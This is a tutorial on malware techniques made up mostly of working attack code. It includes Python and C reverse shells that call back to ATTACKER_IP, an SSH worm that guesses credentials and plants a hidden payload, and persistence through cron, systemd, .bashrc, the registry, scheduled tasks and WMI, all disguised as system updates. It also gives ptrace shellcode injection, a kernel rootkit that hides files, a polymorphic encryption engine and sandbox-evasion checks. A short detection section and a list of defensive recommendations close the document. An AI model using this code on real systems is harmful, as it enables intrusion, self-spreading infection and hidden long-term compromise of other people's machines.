Advanced Malware Techniques: Technical Deep Dive
Table of Contents
Reverse Shells
Worm Propagation
Persistence Mechanisms
Stealth Techniques
Evasion Methods
1. Reverse Shells
Theory and Mechanics
A reverse shell flips the traditional client-server model. Instead of the attacker connecting to the victim (which firewalls often block), the victim initiates an outbound connection to the attacker. This bypasses NAT, ingress filtering, and most firewall configurations since outbound connections are typically permitted.

Why it works:

Firewalls are stateful: outbound connections create return-path allow rules
NAT traversal: the victim initiates, establishing NAT mapping
Most networks allow outbound connections on common ports (80, 443, 53)
Python Reverse Shell (Educational)
python
#!/usr/bin/env python3
"""
Educational Reverse Shell - For authorized testing only
Demonstrates socket programming, process redirection, and OS integration
"""

import socket
import subprocess
import os
import sys
import select
import tty
import termios
import struct
import fcntl

def reverse_shell(attacker_ip, attacker_port):
    """
    Creates an interactive reverse shell with PTY support
    """
    # Create TCP socket
    # AF_INET = IPv4, SOCK_STREAM = TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # TCP provides reliable, ordered delivery. Three-way handshake:
    # SYN → SYN-ACK → ACK establishes the connection
    s.connect((attacker_ip, attacker_port))
    
    # Duplicate socket to stdin/stdout/stderr
    # This is the core mechanism: the shell's I/O is redirected to the network
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout  
    os.dup2(s.fileno(), 2)  # stderr
    
    # Execute shell
    # /bin/sh -i: interactive shell
    # The -i flag ensures job control and prompt are enabled
    subprocess.call(["/bin/sh", "-i"])

def advanced_reverse_shell(attacker_ip, attacker_port):
    """
    Full PTY reverse shell with terminal emulation
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    
    # Save original terminal attributes
    old_tty = termios.tcgetattr(sys.stdin)
    
    try:
        # Create pseudo-terminal
        # PTY allows the shell to believe it's running in a real terminal
        # This enables interactive programs like vim, sudo, passwd
        master, slave = os.openpty()
        
        # Fork process
        # Fork creates a child process that inherits parent's memory space
        pid = os.fork()
        
        if pid == 0:
            # Child process
            os.close(master)
            
            # Redirect child's stdio to slave PTY
            os.dup2(slave, 0)
            os.dup2(slave, 1)
            os.dup2(slave, 2)
            
            # Make slave the controlling terminal
            # This allows job control (Ctrl+C, Ctrl+Z)
            os.setsid()
            os.ioctl(slave, termios.TIOCSCTTY, 0)
            
            # Execute shell
            os.execv("/bin/bash", ["bash", "--rcfile", "/etc/bash.bashrc", "-i"])
        else:
            # Parent process - handles network I/O
            os.close(slave)
            
            # Set raw mode for direct byte pass-through
            tty.setraw(sys.stdin.fileno())
            
            while True:
                # select() monitors multiple file descriptors
                # Returns when any have data ready
                readable, _, _ = select.select([s, sys.stdin], [], [])
                
                for fd in readable:
                    if fd == s:
                        # Data from network - write to stdout
                        data = s.recv(1024)
                        if not data:
                            return
                        sys.stdout.buffer.write(data)
                        sys.stdout.flush()
                    else:
                        # Data from keyboard - send to network
                        data = os.read(sys.stdin.fileno(), 1024)
                        s.sendall(data)
    finally:
        # Restore terminal
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)

# Listener (attacker side)
def start_listener(port):
    """
    Multi-threaded listener for incoming reverse shells
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(5)
    
    print(f"[*] Listening on 0.0.0.0:{port}")
    
    while True:
        client, addr = server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")
        
        # Handle client in thread
        import threading
        client_handler = threading.Thread(
            target=handle_client,
            args=(client,)
        )
        client_handler.start()

def handle_client(client_socket):
    while True:
        # Send command
        command = input("shell> ")
        client_socket.send(command.encode() + b"\n")
        
        # Receive response
        response = client_socket.recv(4096).decode()
        print(response)
C Reverse Shell (Lower Level)
c
/*
 * Educational C Reverse Shell
 * Demonstrates system calls, file descriptor manipulation, and process creation
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in attacker_addr;
    
    // Create socket
    // AF_INET: IPv4 address family
    // SOCK_STREAM: TCP (reliable, connection-oriented)
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        exit(1);
    }
    
    // Configure attacker address
    memset(&attacker_addr, 0, sizeof(attacker_addr));
    attacker_addr.sin_family = AF_INET;
    attacker_addr.sin_port = htons(4444);  // Network byte order (big-endian)
    inet_pton(AF_INET, "ATTACKER_IP", &attacker_addr.sin_addr);
    
    // Establish connection
    if (connect(sockfd, (struct sockaddr *)&attacker_addr, 
                sizeof(attacker_addr)) < 0) {
        perror("connect");
        exit(1);
    }
    
    /*
     * Duplicate file descriptors
     * dup2(oldfd, newfd) makes newfd a copy of oldfd
     * This redirects the shell's I/O to the socket
     */
    dup2(sockfd, STDIN_FILENO);   // File descriptor 0
    dup2(sockfd, STDOUT_FILENO);  // File descriptor 1
    dup2(sockfd, STDERR_FILENO);  // File descriptor 2
    
    /*
     * Execute shell
     * execve replaces current process image with /bin/sh
     * The shell inherits the redirected file descriptors
     */
    char *args[] = {"/bin/sh", "-i", NULL};
    char *env[] = {NULL};
    execve("/bin/sh", args, env);
    
    return 0;
}
2. Worm Propagation
Theory
Worms self-replicate across networks without user intervention. Key components:

Reconnaissance: Find vulnerable targets
Exploitation: Gain access
Replication: Copy payload to new host
Execution: Run on new host
Network Scanning Techniques
python
#!/usr/bin/env python3
"""
Educational Network Scanner
Demonstrates TCP SYN scanning, service detection, and threading
"""

import socket
import threading
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed

class NetworkScanner:
    def __init__(self, timeout=1):
        self.timeout = timeout
        self.open_hosts = []
        self.lock = threading.Lock()
        
    def tcp_syn_scan(self, target_ip, port):
        """
        TCP SYN Scan (Half-open scan)
        
        How it works:
        1. Send SYN packet (connection initiation)
        2. If SYN-ACK received: port is open
        3. Send RST to tear down (avoids full connection logging)
        
        Advantages:
        - Stealth: doesn't complete handshake (less logging)
        - Fast: no need to close connection properly
        """
        try:
            # SOCK_STREAM with timeout
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            # connect() sends SYN, waits for SYN-ACK
            result = sock.connect_ex((target_ip, port))
            
            if result == 0:
                # Port is open
                with self.lock:
                    self.open_hosts.append((target_ip, port))
                    
                # Banner grabbing - identify service
                try:
                    sock.settimeout(2)
                    # Send trigger for response
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    return (target_ip, port, banner.strip())
                except:
                    return (target_ip, port, "Unknown")
                    
            sock.close()
        except:
            pass
        return None
    
    def scan_network(self, network_cidr, ports, max_threads=100):
        """
        Scan entire network range using thread pool
        """
        network = ipaddress.ip_network(network_cidr)
        hosts = [str(ip) for ip in network.hosts()]
        
        print(f"[*] Scanning {len(hosts)} hosts, {len(ports)} ports each...")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            # Submit all scan jobs
            futures = {
                executor.submit(self.tcp_syn_scan, host, port): (host, port)
                for host in hosts
                for port in ports
            }
            
            # Process results as they complete
            for future in as_completed(futures):
                result = future.result()
                if result:
                    print(f"[+] {result[0]}:{result[1]} - {result[2][:50]}")

# SSH Worm Propagation (Educational)
class SSHWorm:
    def __init__(self):
        self.credentials = [
            ('admin', 'admin'),
            ('root', 'root'),
            ('user', 'password'),
            # Common weak credentials for testing
        ]
        self.infected_hosts = set()
        
    def attempt_ssh(self, target_ip, username, password):
        """
        SSH connection attempt using paramiko
        """
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                target_ip,
                username=username,
                password=password,
                timeout=5,
                banner_timeout=5
            )
            
            # Successful authentication
            print(f"[+] SSH success: {target_ip} - {username}/{password}")
            
            # Check if already infected (marker file)
            stdin, stdout, stderr = client.exec_command("cat /tmp/.infected 2>/dev/null")
            if stdout.read().strip():
                print(f"[*] Already infected: {target_ip}")
                client.close()
                return None
                
            return client
            
        except Exception as e:
            return None
    
    def propagate(self, target_ip, payload_path):
        """
        Copy payload and execute on target
        """
        for username, password in self.credentials:
            client = self.attempt_ssh(target_ip, username, password)
            if not client:
                continue
                
            try:
                # SFTP for file transfer
                sftp = client.open_sftp()
                
                # Upload payload with hidden name
                remote_path = "/tmp/.system_update"
                sftp.put(payload_path, remote_path)
                
                # Make executable
                sftp.chmod(remote_path, 0o755)
                
                # Execute payload
                client.exec_command(f"nohup {remote_path} &")
                
                # Mark as infected
                client.exec_command("echo 'infected' > /tmp/.infected")
                
                self.infected_hosts.add(target_ip)
                print(f"[+] Infected: {target_ip}")
                
                sftp.close()
                client.close()
                return True
                
            except Exception as e:
                print(f"[-] Propagation failed: {e}")
                
        return False
3. Persistence Mechanisms
Theory
Persistence ensures malware survives reboots and maintains access. Different platforms require different techniques.

Linux Persistence
python
#!/usr/bin/env python3
"""
Linux Persistence Techniques
Educational demonstration of various persistence methods
"""

import os
import subprocess
import sys

class LinuxPersistence:
    def __init__(self, payload_path):
        self.payload_path = payload_path
        self.home = os.path.expanduser("~")
        
    def cron_persistence(self):
        """
        Cron-based persistence
        
        Cron is the Linux task scheduler. Entries in crontab
        execute at specified intervals.
        
        Technique:
        - Add @reboot entry to user's crontab
        - @reboot executes when system starts
        """
        cron_entry = f"@reboot /usr/bin/python3 {self.payload_path} &\n"
        
        # Append to crontab via crontab command
        # Using echo and pipe to avoid temp files
        cmd = f'(crontab -l 2>/dev/null; echo "{cron_entry.strip()}") | crontab -'
        subprocess.run(cmd, shell=True, capture_output=True)
        
        print("[+] Cron persistence established")
        
    def systemd_persistence(self, service_name="system-update"):
        """
        Systemd service persistence
        
        Modern Linux uses systemd for service management.
        User services can be created without root.
        
        Service file location: ~/.config/systemd/user/
        """
        service_dir = os.path.expanduser("~/.config/systemd/user/")
        os.makedirs(service_dir, exist_ok=True)
        
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {self.payload_path}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
        
        service_path = os.path.join(service_dir, f"{service_name}.service")
        with open(service_path, 'w') as f:
            f.write(service_content)
            
        # Enable service (starts on login)
        subprocess.run(["systemctl", "--user", "enable", service_name], 
                      capture_output=True)
        
        print(f"[+] Systemd service created: {service_name}")
        
    def bashrc_persistence(self):
        """
        .bashrc persistence
        
        .bashrc executes when interactive bash shells start.
        Technique: Append payload execution to end of file.
        """
        bashrc_path = os.path.join(self.home, ".bashrc")
        
        # Check if already persisted
        with open(bashrc_path, 'r') as f:
            content = f.read()
            if self.payload_path in content:
                return
                
        # Append payload execution
        # Uses nohup and & to background and detach from terminal
        payload_line = f'\n# System update\n(nohup python3 {self.payload_path} &>/dev/null &)\n'
        
        with open(bashrc_path, 'a') as f:
            f.write(payload_line)
            
        print("[+] .bashrc persistence established")
        
    def motd_persistence(self):
        """
        MOTD (Message of the Day) persistence
        
        MOTD scripts run when users log in via SSH.
        Located in /etc/update-motd.d/ (requires root)
        """
        motd_script = f"""#!/bin/sh
/usr/bin/python3 {self.payload_path} &
echo "Welcome to Ubuntu 22.04 LTS"
"""
        # This requires root - shown for educational purposes
        # Real implementation would check permissions
        
    def ld_preload_persistence(self):
        """
        LD_PRELOAD persistence (advanced)
        
        LD_PRELOAD loads a shared library before all others.
        Can be used to hook system calls.
        
        Technique:
        1. Create malicious shared library
        2. Set LD_PRELOAD in ~/.bashrc or /etc/ld.so.preload
        """
        # This requires creating a .so file that hooks execve, etc.
        pass

# Windows Persistence
class WindowsPersistence:
    def __init__(self, payload_path):
        self.payload_path = payload_path
        
    def registry_run_key(self):
        """
        Registry Run Keys
        
        Windows executes values in Run/RunOnce keys at startup.
        Location: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        """
        import winreg
        
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 
                                0, winreg.KEY_SET_VALUE)
            # Value name disguised as legitimate
            winreg.SetValueEx(key, "WindowsUpdate", 0, 
                            winreg.REG_SZ, self.payload_path)
            winreg.CloseKey(key)
            print("[+] Registry Run key persistence established")
        except Exception as e:
            print(f"[-] Registry failed: {e}")
    
    def scheduled_task(self):
        """
        Windows Task Scheduler persistence
        
        Uses schtasks.exe to create hidden scheduled task
        """
        import subprocess
        
        cmd = f'''
        schtasks /create /tn "SystemUpdate" /tr "{self.payload_path}" 
        /sc onlogon /rl highest /f
        '''
        subprocess.run(cmd, shell=True, capture_output=True)
        
    def wmi_event_subscription(self):
        """
        WMI Event Subscription (fileless persistence)
        
        Uses Windows Management Instrumentation to trigger
        payload on system events (startup, specific time, etc.)
        
        Highly stealthy - no files, no registry, no processes at rest
        """
        # PowerShell command to create WMI subscription
        ps_cmd = f'''
        $filter = Set-WmiObject -Class __EventFilter -Namespace 
        "root\\subscription" -Arguments @{{
            Name="WindowsUpdateFilter";
            EventNamespace="root\\cimv2";
            QueryLanguage="WQL";
            Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 
            WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
            AND TargetInstance.SystemUpTime >= 200 AND 
            TargetInstance.SystemUpTime < 320"
        }}
        
        $consumer = Set-WmiObject -Class CommandLineEventConsumer 
        -Namespace "root\\subscription" -Arguments @{{
            Name="WindowsUpdateConsumer";
            CommandLineTemplate="{self.payload_path}"
        }}
        
        Set-WmiObject -Class __FilterToConsumerBinding -Namespace 
        "root\\subscription" -Arguments @{{
            Filter=$filter;
            Consumer=$consumer
        }}
        '''
        # Execute via PowerShell
4. Stealth Techniques
Theory
Stealth aims to hide presence from users and security tools. Techniques include:

Process hiding
File hiding
Network traffic camouflage
Memory-only execution
Process Injection (Linux)
c
/*
 * Educational Process Injection (Linux)
 * Demonstrates ptrace-based code injection
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>

/*
 * ptrace (process trace) system call allows one process to
 * control another. Used by debuggers (gdb) and malware.
 * 
 * Steps for injection:
 * 1. Attach to target process (PTRACE_ATTACH)
 * 2. Save current register state
 * 3. Inject shellcode by writing to target's memory
 * 4. Modify instruction pointer to shellcode
 * 5. Continue execution
 * 6. Restore original state
 */

unsigned char shellcode[] = 
    "\x48\x31\xc0"                          // xor rax, rax
    "\x48\x31\xff"                          // xor rdi, rdi
    "\x48\x31\xf6"                          // xor rsi, rsi
    "\x48\x31\xd2"                          // xor rdx, rdx
    "\x4d\x31\xc0"                          // xor r8, r8
    "\x6a\x02"                              // push 2
    "\x5f"                                  // pop rdi
    "\x6a\x01"                              // push 1
    "\x5e"                                  // pop rsi
    "\x6a\x06"                              // push 6
    "\x5a"                                  // pop rdx
    "\x6a\x29"                              // push 41 (socket syscall)
    "\x58"                                  // pop rax
    "\x0f\x05";                             // syscall

int inject_shellcode(pid_t target_pid, unsigned char *shellcode, 
                     size_t shellcode_len) {
    struct user_regs_struct regs, original_regs;
    long ptrace_ret;
    
    // Attach to target
    // This stops the target process
    ptrace_ret = ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
    if (ptrace_ret < 0) {
        perror("ptrace attach");
        return -1;
    }
    
    // Wait for process to stop
    wait(NULL);
    
    // Get register state
    ptrace(PTRACE_GETREGS, target_pid, NULL, &regs);
    memcpy(&original_regs, &regs, sizeof(regs));
    
    // Find injection point - typically we need to allocate memory
    // or overwrite existing code. Here we use a simplified approach
    // of writing to current instruction pointer (not stable, educational only)
    
    // Write shellcode word by word (ptrace writes longs)
    for (size_t i = 0; i < shellcode_len; i += sizeof(long)) {
        long word;
        memcpy(&word, shellcode + i, sizeof(long));
        ptrace(PTRACE_POKETEXT, target_pid, 
               regs.rip + i, word);
    }
    
    // Set instruction pointer to shellcode
    // In real implementation, need proper memory allocation
    
    // Continue execution
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    
    return 0;
}
File Hiding (Linux LKM - Educational)
c
/*
 * Educational Linux Kernel Module for file hiding
 * Demonstrates kernel-level rootkit techniques
 * 
 * Compile: make -C /lib/modules/$(uname -r)/build M=$PWD
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Educational Rootkit");

/*
 * System call table hooking
 * 
 * Linux system calls are function pointers in sys_call_table.
 * By replacing entries, we can intercept kernel functions.
 */

static unsigned long *sys_call_table;

// Original getdents64 syscall
asmlinkage long (*original_getdents64)(unsigned int fd,
    struct linux_dirent64 __user *dirent, unsigned int count);

// Hooked getdents64 - filters out hidden files
asmlinkage long hooked_getdents64(unsigned int fd,
    struct linux_dirent64 __user *dirent, unsigned int count) {
    
    long ret = original_getdents64(fd, dirent, count);
    struct linux_dirent64 *dir, *prev = NULL;
    unsigned long offset = 0;
    
    if (ret <= 0)
        return ret;
    
    // Iterate through directory entries
    while (offset < ret) {
        dir = (void *)dirent + offset;
        
        // Hide files starting with "malware" or containing "rootkit"
        if (strstr(dir->d_name, "malware") || 
            strstr(dir->d_name, "rootkit")) {
            
            // Remove entry by shifting memory
            if (prev) {
                memmove(prev, dir, ret - offset - dir->d_reclen);
                ret -= dir->d_reclen;
                continue;
            }
        }
        
        prev = dir;
        offset += dir->d_reclen;
    }
    
    return ret;
}

static int __init rootkit_init(void) {
    // Find system call table
    sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
    
    // Disable write protection on syscall table
    write_cr0(read_cr0() & (~0x10000));
    
    // Save original and hook
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    
    // Re-enable write protection
    write_cr0(read_cr0() | 0x10000);
    
    printk(KERN_INFO "Rootkit: Module loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    // Restore original syscall
    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    write_cr0(read_cr0() | 0x10000);
    
    printk(KERN_INFO "Rootkit: Module unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
5. Evasion Methods
Theory
Evasion techniques bypass security controls:

Signature evasion: Polymorphism, encryption
Behavioral evasion: Mimicry, timing
Sandbox evasion: Detect virtualized environments
Polymorphic Engine (Educational)
python
#!/usr/bin/env python3
"""
Educational Polymorphic Engine
Demonstrates code mutation to evade signature detection
"""

import random
import base64

class PolymorphicEngine:
    """
    Polymorphic malware changes its code each execution
    while maintaining functionality. Key techniques:
    - Encryption with changing keys
    - Garbage instruction insertion
    - Register swapping
    - Instruction reordering (where possible)
    """
    
    def __init__(self):
        self.encryption_key = random.randint(1, 255)
        
    def generate_garbage_instructions(self, count=5):
        """
        Generate useless x86 instructions that don't affect execution
        but change binary signature
        """
        garbage = [
            b"\x90",              # NOP
            b"\x48\x90",          # NOP (REX)
            b"\x48\x31\xc0",      # XOR RAX, RAX (clears to 0)
            b"\x48\x31\xdb",      # XOR RBX, RBX
            b"\x48\x31\xc9",      # XOR RCX, RCX
            b"\x48\xff\xc0",      # INC RAX
            b"\x48\xff\xc8",      # DEC RAX
            b"\x50\x58",          # PUSH RAX; POP RAX
            b"\x53\x5b",          # PUSH RBX; POP RBX
        ]
        
        return b''.join(random.choices(garbage, k=count))
    
    def xor_encrypt(self, payload, key):
        """
        Simple XOR encryption - changes every run with different key
        """
        return bytes([b ^ key for b in payload])
    
    def generate_decryptor_stub(self, payload_len, key):
        """
        Generate assembly stub that decrypts payload at runtime
        Changes registers used each time
        """
        # Random register selection
        regs = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi']
        reg = random.choice(regs)
        
        # x86-64 decryptor stub (simplified)
        # In real implementation, this would be full assembly
        stub = f"""
        ; Polymorphic decryptor
        ; Key: {key}
        ; Length: {payload_len}
        
        push {reg}
        mov {reg}, encrypted_payload
        mov rcx, {payload_len}
        
    decrypt_loop:
        xor byte ptr [{reg}], {key}
        inc {reg}
        loop decrypt_loop
        
        pop {reg}
        jmp encrypted_payload
        
    encrypted_payload:
        ; Encrypted data follows
        """
        return stub
    
    def mutate_payload(self, payload):
        """
        Full polymorphic transformation
        """
        # Change encryption key
        self.encryption_key = random.randint(1, 255)
        
        # Encrypt payload
        encrypted = self.xor_encrypt(payload, self.encryption_key)
        
        # Generate new decryptor with different registers
        decryptor = self.generate_decryptor_stub(
            len(encrypted), 
            self.encryption_key
        )
        
        # Add garbage instructions
        garbage = self.generate_garbage_instructions(random.randint(3, 10))
        
        return {
            'garbage_prefix': base64.b64encode(garbage).decode(),
            'decryptor': decryptor,
            'encrypted_payload': base64.b64encode(encrypted).decode(),
            'key': self.encryption_key
        }

# Sandbox Evasion
class SandboxEvasion:
    """
    Techniques to detect and evade analysis environments
    """
    
    def check_debugging(self):
        """
        Detect if being debugged
        """
        import ctypes
        
        # Windows IsDebuggerPresent
        if hasattr(ctypes.windll, 'kernel32'):
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                return True
                
        # Check for debugger attachment (ptrace on Linux)
        try:
            import ptrace
            # If we can ptrace ourselves, no debugger attached
            ptrace.traceme()
        except:
            return True
            
        return False
    
    def check_vm_indicators(self):
        """
        Detect virtual machines and sandboxes
        """
        indicators = []
        
        # Check MAC address prefixes (VM vendors)
        vm_macs = ['00:0C:29', '00:50:56', '08:00:27', '52:54:00']
        
        import uuid
        mac = uuid.getnode()
        mac_str = ':'.join(['%02x' % ((mac >> i) & 0xff) 
                           for i in range(40, -1, -8)])
        
        for vm_mac in vm_macs:
            if mac_str.startswith(vm_mac):
                indicators.append(f"VM MAC: {vm_mac}")
        
        # Check for VM-specific processes/files
        vm_files = [
            '/usr/bin/VBoxService',      # VirtualBox
            '/usr/bin/vmware-toolbox',    # VMware
            'C:\\Windows\\System32\\drivers\\vmmouse.sys',
        ]
        
        for f in vm_files:
            if os.path.exists(f):
                indicators.append(f"VM file: {f}")
        
        # Check CPUID hypervisor bit
        # CPUID leaf 1, bit 31 of ECX indicates hypervisor
        
        # Check memory size (sandboxes often have small RAM)
        import psutil
        ram_gb = psutil.virtual_memory().total / (1024**3)
        if ram_gb < 2:
            indicators.append(f"Low RAM: {ram_gb:.1f}GB")
        
        # Check for common sandbox usernames
        sandbox_users = ['sandbox', 'virus', 'malware', 'test', 'admin']
        if os.getlogin().lower() in sandbox_users:
            indicators.append(f"Sandbox user: {os.getlogin()}")
        
        return indicators
    
    def timing_evasion(self):
        """
        Detect emulation by measuring execution time
        Emulators are slower than real hardware
        """
        import time
        
        # High-resolution timing
        start = time.perf_counter()
        
        # CPU-intensive operation
        for _ in range(1000000):
            pass
            
        elapsed = time.perf_counter() - start
        
        # If too slow, might be emulated
        if elapsed > 0.5:  # Threshold
            return True
            
        return False
    
    def sleep_unhooked(self, seconds):
        """
        Bypass API hooking by using alternative sleep methods
        """
        import time
        
        # Instead of Sleep() which AV hooks, use busy wait
        # or alternative timing functions
        
        target = time.time() + seconds
        while time.time() < target:
            # Busy wait - burns CPU but avoids Sleep hooks
            pass

# String Obfuscation
class StringObfuscation:
    """
    Hide suspicious strings from static analysis
    """
    
    @staticmethod
    def stack_strings(s):
        """
        Build strings on stack at runtime instead of .data section
        """
        # Each character as immediate value
        chars = [ord(c) for c in s]
        
        asm = "xor rax, rax\n"
        for i, c in enumerate(chars):
            asm += f"mov byte ptr [rsp+{i}], {c}\n"
        
        return asm
    
    @staticmethod
    def xor_string(s, key=0xAA):
        """
        XOR encode string, decode at runtime
        """
        encoded = ''.join(chr(ord(c) ^ key) for c in s)
        return encoded, key
    
    @staticmethod
    def string_concat_obfuscation(s):
        """
        Build string through concatenation
        """
        parts = [s[i:i+2] for i in range(0, len(s), 2)]
        # "malware" -> "ma" + "lw" + "ar" + "e"
        return parts
Detection and Defense
Behavioral Indicators
python
"""
Malware Detection Techniques
For defensive security professionals
"""

import psutil
import hashlib
import os

class MalwareDetector:
    def __init__(self):
        self.suspicious_patterns = [
            r'.*reverse.*shell.*',
            r'.*backdoor.*',
            r'.*keylogger.*',
        ]
        
    def scan_processes(self):
        """
        Detect suspicious process behavior
        """
        alerts = []
        
        for proc in psutil.process_iter(['pid', 'name', 'connections', 'cmdline']):
            try:
                info = proc.info
                
                # Check for reverse shell indicators
                connections = proc.connections()
                for conn in connections:
                    # Outbound connection with shell process
                    if conn.status == 'ESTABLISHED' and conn.raddr:
                        if any(shell in info['name'].lower() 
                              for shell in ['bash', 'sh', 'cmd', 'powershell']):
                            alerts.append({
                                'type': 'suspicious_connection',
                                'pid': info['pid'],
                                'process': info['name'],
                                'remote': conn.raddr
                            })
                
                # Check for injected code (memory anomaly)
                mem_maps = proc.memory_maps()
                for mmap in mem_maps:
                    # Executable stack or heap (injection indicator)
                    if 'rwx' in mmap.perms:
                        alerts.append({
                            'type': 'rwx_memory',
                            'pid': info['pid'],
                            'process': info['name'],
                            'region': mmap.path
                        })
                        
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
                
        return alerts
    
    def yara_style_scan(self, file_path):
        """
        Signature-based detection
        """
        with open(file_path, 'rb') as f:
            content = f.read()
            
        # Hash-based detection
        file_hash = hashlib.sha256(content).hexdigest()
        
        # String-based detection
        suspicious_strings = [
            b'cmd.exe /c',
            b'/bin/sh -i',
            b'WSASocket',
            b'CreateRemoteThread',
            b'ptrace(PTRACE_TRACEME',
        ]
        
        matches = []
        for s in suspicious_strings:
            if s in content:
                matches.append(s.decode('utf-8', errors='ignore'))
                
        return {
            'hash': file_hash,
            'suspicious_strings': matches
        }
Summary
This tutorial covered the technical foundations of:

Reverse Shells: Socket programming, file descriptor duplication, PTY allocation for interactive sessions
Worms: Network scanning (SYN stealth), automated propagation, credential-based spreading
Persistence: Multiple OS integration points (cron, registry, WMI, systemd) ensuring survival across reboots
Stealth: Kernel-level hooks (LKM), process injection via ptrace, file system filtering
Evasion: Polymorphic encryption, sandbox detection, timing analysis, string obfuscation
Defensive Recommendations:

Monitor for outbound connections from shell processes
Use behavioral detection over signature-based
Implement application whitelisting
Regular integrity checks on critical system files
Network segmentation to limit worm propagation
Principle of least privilege to prevent persistence installation
This knowledge is essential for penetration testers, red team operators, and defensive security professionals to understand the threats they face and develop effective countermeasures.